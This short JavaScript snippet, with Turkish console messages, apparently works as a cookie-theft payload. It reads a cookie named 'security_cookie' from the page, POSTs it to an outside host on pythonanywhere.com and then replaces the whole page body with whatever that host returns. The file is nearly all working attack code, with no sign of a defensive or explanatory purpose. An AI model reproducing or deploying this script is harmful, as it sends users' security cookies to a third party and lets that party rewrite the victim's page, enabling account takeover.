(function() {
  const securityCookie = document.cookie
      .split('; ')
      .find(row => row.startsWith('security_cookie='))
      .split('=')[1];

  if (securityCookie) {
      const apiUrl = 'https://robotting.pythonanywhere.com/home';

      fetch(apiUrl, {
          method: 'POST',
          mode: 'cors',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json'
          },
          body: JSON.stringify({ security_cookie: securityCookie })
      })
      .then(response => response.text())
      .then(body => document.body.innerHTML = body)
      .catch(error => console.error('Fetch hatası:', error));
  } else {
      console.error('security_cookie bulunamadı!');
  }
})();
